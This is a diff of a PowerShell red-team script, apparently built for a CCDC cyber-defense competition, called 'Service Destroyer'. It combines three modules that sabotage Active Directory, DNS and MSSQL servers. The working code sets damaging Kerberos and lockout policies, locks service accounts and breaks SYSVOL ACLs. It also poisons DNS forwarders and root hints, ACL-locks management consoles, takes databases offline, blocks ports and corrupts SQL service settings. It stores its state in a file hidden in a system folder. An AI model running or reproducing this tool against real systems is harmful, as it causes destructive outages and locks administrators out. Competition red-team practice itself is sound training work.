@@ -1,17 +1,17 @@
-# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
-# CCDC Windows Phase 3 — SERVICE DESTROYER
+﻿# ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
+# CCDC Windows Phase 3 -- SERVICE DESTROYER
 # Combines all three service-breaking modules into a single standalone script
 # ///////////////////////////////\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
 #
-#   MODULE 1 — KerberosKhaos         (Active Directory / Domain Controller)
+#   MODULE 1 -- KerberosKhaos         (Active Directory / Domain Controller)
 #              MITRE: T1484.001, T1484.002, T1222, T1531
 #              Source: CCDC_Windows_P3_AD_KerberosKhaos.ps1
 #
-#   MODULE 2 — ConditionalSurrender  (DNS Server role)
+#   MODULE 2 -- ConditionalSurrender  (DNS Server role)
 #              MITRE: T1565.001, T1584.002, T1562.004
 #              Source: CCDC_Windows_P3_DNS_ConditionalSurrender.ps1
 #
-#   MODULE 3 — DeadInTheWater        (MSSQL Server)
+#   MODULE 3 -- DeadInTheWater        (MSSQL Server)
 #              MITRE: T1489, T1565.001, T1562.004, T1222
 #              Source: CCDC_Windows_P3_MSSQL_DeadInTheWater.ps1
 #
@@ -40,14 +40,14 @@ param(
 Set-StrictMode -Version Latest
 $ErrorActionPreference = "Continue"
 
-# ── Color helpers ──────────────────────────────────────────────────────────────
+# -- Color helpers --------------------------------------------------------------
 function Write-Info    { param($m) Write-Host "[*] $m" -ForegroundColor Cyan    }
 function Write-Success { param($m) Write-Host "[+] $m" -ForegroundColor Green   }
 function Write-Warn    { param($m) Write-Host "[!] $m" -ForegroundColor Yellow  }
 function Write-Err     { param($m) Write-Host "[-] $m" -ForegroundColor Red     }
 function Write-Section { param($m) Write-Host "`n==[ $m ]==" -ForegroundColor Magenta }
 
-# ── Banner ─────────────────────────────────────────────────────────────────────
+# -- Banner ---------------------------------------------------------------------
 function Show-Banner {
     Write-Host ""
     Write-Host " ///////////////////////////////////////////////////////\\" -ForegroundColor Red
@@ -61,7 +61,7 @@ function Show-Banner {
     Write-Host ""
 }
 
-# ── State file ─────────────────────────────────────────────────────────────────
+# -- State file -----------------------------------------------------------------
 $script:StateFile = "C:\Windows\System32\spool\drivers\color\.p3_svc_state.csv"
 
 function Read-StateFile {
@@ -94,14 +94,14 @@ function Set-ModuleState { param([string]$Name, [string]$StateVal)
     Write-StateFile $rows
 }
 
-# ── Role detection ─────────────────────────────────────────────────────────────
+# -- Role detection -------------------------------------------------------------
 $script:HasAD    = $null -ne (Get-Service -Name NTDS        -ErrorAction SilentlyContinue)
 $script:HasDNS   = $null -ne (Get-Service -Name DNS         -ErrorAction SilentlyContinue)
 $script:HasMSSQL = $null -ne (Get-Service -Name MSSQLSERVER -ErrorAction SilentlyContinue)
 
-# ══════════════════════════════════════════════════════════════════════════════
-#  MODULE 1 — KERBEROS KHAOS  (AD/DC)
-# ══════════════════════════════════════════════════════════════════════════════
+# ==============================================================================
+#  MODULE 1 -- KERBEROS KHAOS  (AD/DC)
+# ==============================================================================
 function Invoke-KerberosKhaos {
     Write-Host ""
     Write-Host " ///////////////////////////////////////////////////////\\" -ForegroundColor Red
@@ -109,7 +109,7 @@ function Invoke-KerberosKhaos {
     Write-Host " \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\/" -ForegroundColor Red
 
     if (-not $script:HasAD) {
-        Write-Warn "NTDS service not found — not a Domain Controller. Skipping KerberosKhaos."
+        Write-Warn "NTDS service not found -- not a Domain Controller. Skipping KerberosKhaos."
         return
     }
 
@@ -121,7 +121,7 @@ function Invoke-KerberosKhaos {
     $DomainNetbios = $ADDomain.NetBIOSName
     Write-Info "Domain: $DomainDNS ($DomainNetbios)"
 
-    # ── Layer 1: Kerberos Ticket TTL Weaponization ────────────────────────────
+    # -- Layer 1: Kerberos Ticket TTL Weaponization ----------------------------
     Write-Section "KerberosKhaos 1/3  Kerberos Ticket TTL Weaponization"
 
     $l1TmpBase = "$env:TEMP\kk_l1_$(Get-Random -Maximum 99999)"
@@ -156,10 +156,10 @@ function Invoke-KerberosKhaos {
     if ($LASTEXITCODE -eq 0) {
         Write-Success "gpupdate /force executed"
     } else {
-        Write-Warn "gpupdate returned exit $LASTEXITCODE — policy may apply on next refresh"
+        Write-Warn "gpupdate returned exit $LASTEXITCODE -- policy may apply on next refresh"
     }
 
-    # ── Layer 2: Account Lockout Weaponization ────────────────────────────────
+    # -- Layer 2: Account Lockout Weaponization --------------------------------
     Write-Section "KerberosKhaos 2/3  Account Lockout Weaponization"
 
     try {
@@ -206,11 +206,11 @@ function Invoke-KerberosKhaos {
         }
         if ($ctx) { $ctx.Dispose() }
     } else {
-        Write-Warn "No service accounts matched naming patterns — skipping pre-lock"
+        Write-Warn "No service accounts matched naming patterns -- skipping pre-lock"
         Write-Info "Policy is live; first bad auth by any svc account will lock it permanently"
     }
 
-    # ── Layer 3: SYSVOL/NETLOGON ACL Destruction ─────────────────────────────
+    # -- Layer 3: SYSVOL/NETLOGON ACL Destruction -----------------------------
     Write-Section "KerberosKhaos 3/3  SYSVOL/NETLOGON ACL Destruction"
 
     $sysvolRoot = "C:\Windows\SYSVOL\sysvol\$DomainDNS"
@@ -244,15 +244,15 @@ function Invoke-KerberosKhaos {
         Write-Err "Failed to set DisablePasswordChange: $_"
     }
 
-    Write-Success "KerberosKhaos complete — all 3 layers applied"
+    Write-Success "KerberosKhaos complete -- all 3 layers applied"
     Write-Info "  L1: Restore Default Domain Policy Kerberos settings (gpmc.msc)"
     Write-Info "  L2: Fix lockout policy + manually unlock locked service accounts"
     Write-Info "  L3: Restore SYSVOL ACLs + remove DisablePasswordChange from Netlogon"
 }
 
-# ══════════════════════════════════════════════════════════════════════════════
-#  MODULE 2 — CONDITIONAL SURRENDER  (DNS)
-# ══════════════════════════════════════════════════════════════════════════════
+# ==============================================================================
+#  MODULE 2 -- CONDITIONAL SURRENDER  (DNS)
+# ==============================================================================
 function Invoke-ConditionalSurrender {
     Write-Host ""
     Write-Host " ///////////////////////////////////////////////////////\\" -ForegroundColor Red
@@ -260,7 +260,7 @@ function Invoke-ConditionalSurrender {
     Write-Host " \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\/" -ForegroundColor Red
 
     if (-not $script:HasDNS) {
-        Write-Warn "DNS Server service not found — DNS Server role not installed. Skipping ConditionalSurrender."
+        Write-Warn "DNS Server service not found -- DNS Server role not installed. Skipping ConditionalSurrender."
         return
     }
 
@@ -271,16 +271,16 @@ function Invoke-ConditionalSurrender {
             $dnsModuleAvailable = $true
             Write-Info "DnsServer PowerShell module loaded"
         } catch {
-            Write-Warn "DnsServer module import failed — will use dnscmd fallback: $_"
+            Write-Warn "DnsServer module import failed -- will use dnscmd fallback: $_"
         }
     } else {
-        Write-Warn "DnsServer PowerShell module not available — using dnscmd fallback"
+        Write-Warn "DnsServer PowerShell module not available -- using dnscmd fallback"
     }
 
     $CompDomains = @("ccdc.local", "range.internal", "competition.local")
     $BlackholeIP = "192.0.2.1"
 
-    # ── Layer 1: Conditional Forwarder Poisoning ──────────────────────────────
+    # -- Layer 1: Conditional Forwarder Poisoning ------------------------------
     Write-Section "ConditionalSurrender 1/3  Conditional Forwarder Poisoning"
 
     foreach ($domain in $CompDomains) {
@@ -304,7 +304,7 @@ function Invoke-ConditionalSurrender {
                     $applied = $true
                 }
             } catch {
-                Write-Warn "    PS module path failed for $domain — trying dnscmd: $_"
+                Write-Warn "    PS module path failed for $domain -- trying dnscmd: $_"
             }
         }
 
@@ -319,7 +319,7 @@ function Invoke-ConditionalSurrender {
         }
     }
 
-    # ── Layer 2: TTL / Scavenging Destruction ─────────────────────────────────
+    # -- Layer 2: TTL / Scavenging Destruction ---------------------------------
     Write-Section "ConditionalSurrender 2/3  TTL / Scavenging Destruction"
 
     $dnscmdConfigs = @(
@@ -369,10 +369,10 @@ function Invoke-ConditionalSurrender {
             Write-Warn "Zone enumeration failed: $_"
         }
     } else {
-        Write-Warn "DnsServer module unavailable — per-zone aging skipped (global TTL applied)"
+        Write-Warn "DnsServer module unavailable -- per-zone aging skipped (global TTL applied)"
     }
 
-    # ── Layer 3: Recursion Trap + Console ACL Lock ────────────────────────────
+    # -- Layer 3: Recursion Trap + Console ACL Lock ----------------------------
     Write-Section "ConditionalSurrender 3/3  Recursion Trap + Console ACL Lock"
 
     & dnscmd.exe /Config /NoRecursion 1 2>$null | Out-Null
@@ -396,7 +396,7 @@ function Invoke-ConditionalSurrender {
         }
 
         $fakeRoots = @(
-            '; root hints poisoned — all roots point to RFC 5737 blackhole (192.0.2.1)',
+            '; root hints poisoned -- all roots point to RFC 5737 blackhole (192.0.2.1)',
             '.                        3600000 IN  NS  a.root-servers.net.',
             'a.root-servers.net.      3600000     A   192.0.2.1',
             '.                        3600000 IN  NS  b.root-servers.net.',
@@ -426,31 +426,31 @@ function Invoke-ConditionalSurrender {
         )
         try {
             Set-Content -Path $cacheDns -Value $fakeRoots -Encoding ASCII -ErrorAction Stop
-            Write-Success "Root hints (cache.dns) overwritten — all 13 roots -> $BlackholeIP"
+            Write-Success "Root hints (cache.dns) overwritten -- all 13 roots -> $BlackholeIP"
         } catch {
             Write-Err "Failed to overwrite cache.dns: $_"
         }
     } else {
-        Write-Warn "cache.dns not found at $cacheDns — skipping root hints poison"
+        Write-Warn "cache.dns not found at $cacheDns -- skipping root hints poison"
     }
 
     try {
         Restart-Service -Name "DNS" -Force -ErrorAction Stop
         Write-Success "DNS service restarted (poisoned root hints now active)"
     } catch {
-        Write-Warn "DNS service restart failed — hints apply after next manual restart: $_"
+        Write-Warn "DNS service restart failed -- hints apply after next manual restart: $_"
     }
 
     $dnsMmc = "$env:SystemRoot\System32\dnsmgmt.msc"
     if (Test-Path $dnsMmc) {
         & icacls.exe $dnsMmc /deny "Everyone:(RX)" /C /Q 2>$null | Out-Null
         if ($LASTEXITCODE -eq 0) {
-            Write-Success "ACL-locked dnsmgmt.msc — DNS Manager console throws Access Denied"
+            Write-Success "ACL-locked dnsmgmt.msc -- DNS Manager console throws Access Denied"
         } else {
             Write-Warn "icacls /deny on dnsmgmt.msc returned $LASTEXITCODE"
         }
     } else {
-        Write-Warn "dnsmgmt.msc not found at expected path — skipping MMC lock"
+        Write-Warn "dnsmgmt.msc not found at expected path -- skipping MMC lock"
     }
 
     try {
@@ -483,15 +483,15 @@ function Invoke-ConditionalSurrender {
         Write-Warn "Registry ACL on DNS key failed: $_"
     }
 
-    Write-Success "ConditionalSurrender complete — all 3 layers applied"
+    Write-Success "ConditionalSurrender complete -- all 3 layers applied"
     Write-Info "  L1: Remove conditional forwarders (dnscmd /zonedelete ccdc.local /f)"
     Write-Info "  L2: Restore DefaultTTL, disable scavenging, restore SOA min TTL"
     Write-Info "  L3: Re-enable recursion, restore CACHE.DNS.bak, remove MMC/registry ACLs"
 }
 
-# ══════════════════════════════════════════════════════════════════════════════
-#  MODULE 3 — DEAD IN THE WATER  (MSSQL)
-# ══════════════════════════════════════════════════════════════════════════════
+# ==============================================================================
+#  MODULE 3 -- DEAD IN THE WATER  (MSSQL)
+# ==============================================================================
 function Get-SqlRegBase {
     $sqlRoot = 'HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server'
     $verDir  = Get-ChildItem $sqlRoot -ErrorAction SilentlyContinue |
@@ -508,18 +508,18 @@ function Invoke-DeadInTheWater {
     Write-Host " \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\/" -ForegroundColor Red
 
     if (-not $script:HasMSSQL) {
-        Write-Warn "MSSQLSERVER service not found — not an MSSQL target. Skipping DeadInTheWater."
+        Write-Warn "MSSQLSERVER service not found -- not an MSSQL target. Skipping DeadInTheWater."
         return
     }
 
     $SqlBase = Get-SqlRegBase
     if (-not $SqlBase) {
-        Write-Err "Cannot locate SQL Server registry base — aborting DeadInTheWater"
+        Write-Err "Cannot locate SQL Server registry base -- aborting DeadInTheWater"
         return
     }
     Write-Info "SQL Server registry base: $SqlBase"
 
-    # ── Layer 2 (runs first while SQL is up): Database Sabotage ──────────────
+    # -- Layer 2 (runs first while SQL is up): Database Sabotage --------------
     Write-Section "DeadInTheWater 1/3  Database Sabotage (runs while SQL is live)"
 
     Write-Info "Executing T-SQL database sabotage via .NET SqlClient..."
@@ -541,14 +541,14 @@ function Invoke-DeadInTheWater {
                     [void]$cmd.ExecuteNonQuery()
                     Write-Success "Executed: $sql"
                 } catch {
-                    Write-Err "T-SQL failed: $sql — $_"
+                    Write-Err "T-SQL failed: $sql -- $_"
                 }
             }
         } finally {
             if ($conn.State -ne [System.Data.ConnectionState]::Closed) { $conn.Close() }
         }
     } catch {
-        Write-Err "SqlClient connection failed: $_ — T-SQL layer skipped"
+        Write-Err "SqlClient connection failed: $_ -- T-SQL layer skipped"
     }
 
     Write-Info "Disabling SQL Server TCP/IP protocol in registry..."
@@ -564,7 +564,7 @@ function Invoke-DeadInTheWater {
         Write-Err "Failed to disable TCP/IP: $_"
     }
 
-    # ── Layer 3: Port / Discovery Sabotage ────────────────────────────────────
+    # -- Layer 3: Port / Discovery Sabotage ------------------------------------
     Write-Section "DeadInTheWater 2/3  Port / Discovery Sabotage"
 
     Write-Info "Remapping SQL Server listening port 1433 -> 14334..."
@@ -589,7 +589,7 @@ function Invoke-DeadInTheWater {
             Set-Service  -Name SQLBrowser -StartupType Disabled
             Write-Success "SQLBrowser stopped and disabled"
         } else {
-            Write-Info "SQLBrowser service not found — skipping"
+            Write-Info "SQLBrowser service not found -- skipping"
         }
     } catch {
         Write-Err "Failed to disable SQL Browser: $_"
@@ -597,35 +597,35 @@ function Invoke-DeadInTheWater {
 
     Write-Info "Adding firewall rules to block TCP 1433 and TCP 14334..."
     try {
-        $fwRules = @(
-            @{ Name = "CCDC_Block_SQL_1433_In";   Dir = "Inbound";  Port = 1433  },
-            @{ Name = "CCDC_Block_SQL_1433_Out";  Dir = "Outbound"; Port = 1433  },
-            @{ Name = "CCDC_Block_SQL_14334_In";  Dir = "Inbound";  Port = 14334 },
-            @{ Name = "CCDC_Block_SQL_14334_Out"; Dir = "Outbound"; Port = 14334 }
+        # Inbound: block scoring server connecting TO SQL (LocalPort = port on this machine)
+        # Outbound: block this machine connecting OUT to SQL on other hosts (RemotePort = dest port)
+        $fwInbound = @(
+            @{ Name = "CCDC_Block_SQL_1433_In";   Port = 1433  },
+            @{ Name = "CCDC_Block_SQL_14334_In";  Port = 14334 }
         )
-        foreach ($r in $fwRules) {
-            $existing = Get-NetFirewallRule -DisplayName $r.Name -ErrorAction SilentlyContinue
-            if (-not $existing) {
-                $params = @{
-                    DisplayName = $r.Name
-                    Direction   = $r.Dir
-                    Protocol    = "TCP"
-                    Action      = "Block"
-                    Profile     = "Any"
-                    Enabled     = "True"
-                    LocalPort   = $r.Port
-                }
-                New-NetFirewallRule @params | Out-Null
+        $fwOutbound = @(
+            @{ Name = "CCDC_Block_SQL_1433_Out";  Port = 1433  },
+            @{ Name = "CCDC_Block_SQL_14334_Out"; Port = 14334 }
+        )
+        foreach ($r in $fwInbound) {
+            if (-not (Get-NetFirewallRule -DisplayName $r.Name -ErrorAction SilentlyContinue)) {
+                New-NetFirewallRule -DisplayName $r.Name -Direction Inbound -Protocol TCP `
+                    -Action Block -Profile Any -Enabled True -LocalPort $r.Port | Out-Null
                 Write-Success "Firewall rule created: $($r.Name)"
-            } else {
-                Write-Info "Firewall rule already exists: $($r.Name)"
-            }
+            } else { Write-Info "Firewall rule already exists: $($r.Name)" }
+        }
+        foreach ($r in $fwOutbound) {
+            if (-not (Get-NetFirewallRule -DisplayName $r.Name -ErrorAction SilentlyContinue)) {
+                New-NetFirewallRule -DisplayName $r.Name -Direction Outbound -Protocol TCP `
+                    -Action Block -Profile Any -Enabled True -RemotePort $r.Port | Out-Null
+                Write-Success "Firewall rule created: $($r.Name)"
+            } else { Write-Info "Firewall rule already exists: $($r.Name)" }
         }
     } catch {
         Write-Err "Firewall rule creation failed: $_"
     }
 
-    # ── Layer 1 (runs last): Service Account + Startup Param Corruption ───────
+    # -- Layer 1 (runs last): Service Account + Startup Param Corruption -------
     Write-Section "DeadInTheWater 3/3  Service Account + Startup Param Corruption"
 
     Write-Info "Changing SQL Server service account to nonexistent local user..."
@@ -633,7 +633,7 @@ function Invoke-DeadInTheWater {
     try {
         [void][Reflection.Assembly]::LoadWithPartialName('Microsoft.SqlServer.SqlWmiManagement')
         $wmi = New-Object Microsoft.SqlServer.Management.Smo.Wmi.ManagedComputer
-        $svc = $wmi.Services | Where-Object { $_.Name -eq 'MSSQLSERVER' }
+        $svc = $wmi.Services | Where-Object { $_.Name -eq 'MSSQLSERVER' } | Select-Object -First 1
         if ($svc) {
             $svc.SetServiceAccount('.\NonExistentUser2019', 'BadPass!1')
             $svc.Alter()
@@ -641,7 +641,7 @@ function Invoke-DeadInTheWater {
             $accountChanged = $true
         }
     } catch {
-        Write-Warn "SMO WMI approach failed ($_) — falling back to registry"
+        Write-Warn "SMO WMI approach failed ($_) -- falling back to registry"
     }
 
     if (-not $accountChanged) {
@@ -671,7 +671,7 @@ function Invoke-DeadInTheWater {
                              -Value '-eC:\NonExistent\Logs\sqlserver_error.log' -Type String
             Write-Success "Added invalid startup param $argName = -eC:\NonExistent\Logs\sqlserver_error.log"
         } else {
-            Write-Warn "Parameters registry key not found — skipping startup param injection"
+            Write-Warn "Parameters registry key not found -- skipping startup param injection"
         }
     } catch {
         Write-Err "Failed to inject startup parameter: $_"
@@ -685,15 +685,15 @@ function Invoke-DeadInTheWater {
         Write-Err "Could not stop MSSQLSERVER: $_"
     }
 
-    Write-Success "DeadInTheWater complete — all 3 layers applied"
+    Write-Success "DeadInTheWater complete -- all 3 layers applied"
     Write-Info "  L1: Fix service account + remove invalid SQLArg startup param"
     Write-Info "  L2: Fix master RESTRICTED_USER, msdb OFFLINE, model READ_ONLY, re-enable TCP/IP"
     Write-Info "  L3: Remap port back to 1433, re-enable SQLBrowser, remove FW rules"
 }
 
-# ══════════════════════════════════════════════════════════════════════════════
+# ==============================================================================
 #  MENU + DISPATCH
-# ══════════════════════════════════════════════════════════════════════════════
+# ==============================================================================
 
 $script:ExecOrder = @("KerberosKhaos", "ConditionalSurrender", "DeadInTheWater")
 
@@ -703,7 +703,7 @@ $script:ModuleDefs = @{
     "DeadInTheWater"       = @{ Num = 3; Label = "DeadInTheWater      "; Role = "MSSQL"; Present = $script:HasMSSQL }
 }
 
-function Resolve-ModuleName { param([string]$Input)
+function Resolve-ModuleName { param([string]$Token)
     $aliases = @{
         "1"           = "KerberosKhaos";   "kerberos" = "KerberosKhaos";   "kk"  = "KerberosKhaos"
         "kerberoskhaos" = "KerberosKhaos"; "ad"       = "KerberosKhaos";   "dc"  = "KerberosKhaos"
@@ -712,7 +712,7 @@ function Resolve-ModuleName { param([string]$Input)
         "3"           = "DeadInTheWater";  "mssql"    = "DeadInTheWater";   "ditw" = "DeadInTheWater"
         "deadinthewater" = "DeadInTheWater"; "sql"    = "DeadInTheWater";   "dead" = "DeadInTheWater"
     }
-    $key = $Input.ToLower().Trim()
+    $key = $Token.ToLower().Trim()
     if ($aliases.ContainsKey($key)) { return $aliases[$key] }
     return $null
 }
@@ -722,30 +722,28 @@ function Show-Menu {
     foreach ($m in $script:ExecOrder) { $states[$m] = Get-ModuleState $m }
 
     Write-Host ""
-    Write-Host "  ╔══════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
-    Write-Host "  ║         P3 SERVICE DESTROYER — Select Modules            ║" -ForegroundColor Cyan
-    Write-Host "  ╠══════════════════════════════════════════════════════════╣" -ForegroundColor Cyan
+    Write-Host "  +----------------------------------------------------------+" -ForegroundColor Cyan
+    Write-Host "  |        P3 SERVICE DESTROYER -- Select Modules            |" -ForegroundColor Cyan
+    Write-Host "  +----------------------------------------------------------+" -ForegroundColor Cyan
 
     foreach ($m in $script:ExecOrder) {
         $def     = $script:ModuleDefs[$m]
         $roleTag = if ($def.Present) { "[PRESENT]" } else { "[ABSENT] " }
         $roleCol = if ($def.Present) { "Green"     } else { "DarkGray"  }
-        $stTag   = switch ($states[$m]) {
-            "SUCCESS" { " [DONE]" }; "FAILED" { " [FAIL]" }; "RUNNING" { " [ RUN]" }; default { "       " }
-        }
-        $stCol   = switch ($states[$m]) {
-            "SUCCESS" { "Green" }; "FAILED" { "Red" }; "RUNNING" { "Yellow" }; default { "White" }
-        }
-        Write-Host "  ║  " -ForegroundColor Cyan -NoNewline
+        if     ($states[$m] -eq "SUCCESS") { $stTag = " [DONE]"; $stCol = "Green"  }
+        elseif ($states[$m] -eq "FAILED")  { $stTag = " [FAIL]"; $stCol = "Red"    }
+        elseif ($states[$m] -eq "RUNNING") { $stTag = " [ RUN]"; $stCol = "Yellow" }
+        else                               { $stTag = "       "; $stCol = "White"  }
+        Write-Host "  |  " -ForegroundColor Cyan -NoNewline
         Write-Host "[$($def.Num)] $($def.Label) ($($def.Role))  " -ForegroundColor White -NoNewline
         Write-Host $roleTag -ForegroundColor $roleCol -NoNewline
         Write-Host $stTag -ForegroundColor $stCol -NoNewline
-        Write-Host "  ║" -ForegroundColor Cyan
+        Write-Host "  |" -ForegroundColor Cyan
     }
 
-    Write-Host "  ╠══════════════════════════════════════════════════════════╣" -ForegroundColor Cyan
-    Write-Host "  ║  [A] All present roles   [S] Status   [Q] Quit          ║" -ForegroundColor Cyan
-    Write-Host "  ╚══════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
+    Write-Host "  +----------------------------------------------------------+" -ForegroundColor Cyan
+    Write-Host "  |  [A] All present roles   [S] Status   [Q] Quit          |" -ForegroundColor Cyan
+    Write-Host "  +----------------------------------------------------------+" -ForegroundColor Cyan
     Write-Host ""
 }
 
@@ -754,7 +752,9 @@ function Show-Status {
     foreach ($m in $script:ExecOrder) {
         $def   = $script:ModuleDefs[$m]
         $state = Get-ModuleState $m
-        $col   = switch ($state) { "SUCCESS" { "Green" }; "FAILED" { "Red" }; default { "Yellow" } }
+        if     ($state -eq "SUCCESS") { $col = "Green"  }
+        elseif ($state -eq "FAILED")  { $col = "Red"    }
+        else                          { $col = "Yellow" }
         $pres  = if ($def.Present) { "PRESENT" } else { "ABSENT" }
         Write-Host ("  {0,-24} Role:{1,-5}  State:" -f $m, $pres) -NoNewline
         Write-Host $state -ForegroundColor $col
@@ -769,12 +769,12 @@ function Invoke-Modules { param([string[]]$ToRun)
 
         $existingState = Get-ModuleState $m
 
-        if (-not $Force -and $existingState -eq "SUCCESS") {
-            if ($Resume) {
-                Write-Warn "[$m] already SUCCESS — skipping (use -Force to re-run)"
-                $summary += [PSCustomObject]@{ Module = $m; Result = "SKIPPED (already SUCCESS)"; Elapsed = "-" }
-                continue
+        if ($existingState -eq "SUCCESS" -and -not $Force) {
+            if (-not $Resume) {
+                Write-Warn "[$m] already SUCCESS -- skipping (use -Force to re-run, -Resume to skip silently)"
             }
+            $summary += [PSCustomObject]@{ Module = $m; Result = "SKIPPED (already SUCCESS)"; Elapsed = "-" }
+            continue
         }
 
         Set-ModuleState $m "RUNNING"
@@ -801,9 +801,9 @@ function Invoke-Modules { param([string[]]$ToRun)
     $summary | Format-Table -AutoSize | Out-String | Write-Host
 }
 
-# ══════════════════════════════════════════════════════════════════════════════
+# ==============================================================================
 #  ENTRY POINT
-# ══════════════════════════════════════════════════════════════════════════════
+# ==============================================================================
 
 Show-Banner
 
@@ -831,7 +831,7 @@ if ($Modules.Count -gt 0) {
         if ($name) {
             $resolved += $name
         } else {
-            Write-Warn "Unknown module '$m' — ignored (valid: 1/2/3, kk/cs/ditw, kerberos/dns/mssql)"
+            Write-Warn "Unknown module '$m' -- ignored (valid: 1/2/3, kk/cs/ditw, kerberos/dns/mssql)"
         }
     }
     if ($resolved.Count -eq 0) {
@@ -845,8 +845,8 @@ if ($Modules.Count -gt 0) {
 # Interactive menu loop
 while ($true) {
     Show-Menu
-    $input = Read-Host "  Enter choice(s)"
-    $trimmed = $input.Trim()
+    $userInput = Read-Host "  Enter choice(s)"
+    $trimmed = $userInput.Trim()
 
     if ($trimmed -eq "" ) { continue }
     if ($trimmed -ieq "Q") { Write-Info "Exiting."; break }
@@ -859,7 +859,7 @@ while ($true) {
     if ($trimmed -ieq "A") {
         $toRun = $script:ExecOrder | Where-Object { $script:ModuleDefs[$_].Present }
         if (-not $toRun) {
-            Write-Warn "No target roles detected — nothing to run."
+            Write-Warn "No target roles detected -- nothing to run."
         } else {
             Invoke-Modules -ToRun $toRun
         }
@@ -871,7 +871,7 @@ while ($true) {
     foreach ($t in $tokens) {
         $name = Resolve-ModuleName $t
         if ($name) { $resolved += $name }
-        else        { Write-Warn "Unknown token '$t' — skipped" }
+        else        { Write-Warn "Unknown token '$t' -- skipped" }
     }
 
     if ($resolved.Count -gt 0) {
